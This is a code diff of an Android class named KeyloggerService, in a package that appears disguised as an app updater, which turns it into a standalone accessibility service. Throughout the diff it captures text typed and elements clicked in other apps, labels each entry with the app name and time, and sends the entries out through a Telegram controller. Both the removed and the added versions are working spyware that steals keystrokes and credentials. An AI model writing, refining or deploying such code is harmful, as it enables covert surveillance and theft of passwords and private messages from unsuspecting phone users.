@@ -1,68 +1,77 @@
 package com.kasari.update;
 
+import android.accessibilityservice.AccessibilityService;
+import android.accessibilityservice.AccessibilityServiceInfo;
+import android.content.Intent;
 import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
 import java.text.SimpleDateFormat;
-import java.util.*;
+import java.util.Date;
+import java.util.Locale;
 
-/**
- * Processes accessibility events to capture text input.
- * Called from ScreenMirror.onAccessibilityEvent().
- * No separate registration needed — piggybacks on ScreenMirror's AccessibilityService.
- */
-public class KeyloggerService {
+public class KeyloggerService extends AccessibilityService {
 
-    private static final int MAX_LOG = 500;
-    private static final StringBuilder mLog = new StringBuilder();
-    private static String mLastApp = "";
-    private static long mLastSend = 0;
+    private static String lastLoggedText = "";
+    private static long lastLogTime = 0;
 
-    public static void onEvent(AccessibilityEvent event) {
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event == null) return;
-        int type = event.getEventType();
-
-        // Track active app window
-        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            CharSequence pkg = event.getPackageName();
-            if (pkg != null && !pkg.toString().equals(mLastApp)) {
-                mLastApp = pkg.toString();
-            }
-            return;
-        }
-
-        // Capture text input
-        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            List<CharSequence> texts = event.getText();
-            if (texts != null && !texts.isEmpty()) {
-                String text = texts.get(0).toString().trim();
-                if (!text.isEmpty()) {
-                    String ts = new SimpleDateFormat("HH:mm:ss", Locale.getDefault())
-                        .format(new Date());
-                    mLog.append("[").append(ts).append("] [").append(mLastApp)
-                        .append("] ").append(text).append("\n");
+        
+        try {
+            int eventType = event.getEventType();
+            CharSequence eventText = null;
+            
+            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                eventText = event.getText();
+            } else if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                AccessibilityNodeInfo source = event.getSource();
+                if (source != null) {
+                    eventText = source.getText();
+                    if (eventText == null || eventText.length() == 0) {
+                        eventText = source.getContentDescription();
+                    }
+                    source.recycle();
                 }
             }
-        }
-
-        // Auto-send if buffer full or every 5 minutes
-        long now = System.currentTimeMillis();
-        boolean full = mLog.length() >= MAX_LOG;
-        boolean timePassed = (now - mLastSend) > 5 * 60 * 1000L;
-        if ((full || timePassed) && mLog.length() > 0) {
-            flush();
+            
+            if (eventText != null && eventText.length() > 0) {
+                String text = eventText.toString().trim();
+                String packageName = event.getPackageName() != null ? 
+                    event.getPackageName().toString() : "unknown";
+                
+                if (!text.isEmpty() && !text.equals(lastLoggedText) && 
+                    (System.currentTimeMillis() - lastLogTime > 5000)) {
+                    
+                    lastLoggedText = text;
+                    lastLogTime = System.currentTimeMillis();
+                    
+                    String timestamp = new SimpleDateFormat("HH:mm:ss", 
+                        Locale.getDefault()).format(new Date());
+                    
+                    TelegramController.sendMessage(this, 
+                        "⌨️ **Keylog** [" + packageName + "]\n" + text + 
+                        "\n🕐 " + timestamp);
+                }
+            }
+            
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
-    private static synchronized void flush() {
-        if (mLog.length() == 0) return;
-        String log = mLog.toString();
-        mLog.setLength(0);
-        mLastSend = System.currentTimeMillis();
-        new Thread(() -> TelegramController.sendMessage(
-            "⌨️ Keylog:\n" + log)).start();
-    }
+    @Override
+    public void onInterrupt() {}
 
-    // Called by /notifications command in CommandProcessor
-    public static void sendBuffer() {
-        flush();
+    @Override
+    public void onServiceConnected() {
+        super.onServiceConnected();
+        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
+        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
+        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
+        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | 
+                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
+        info.notificationTimeout = 100;
+        setServiceInfo(info);
     }
 }
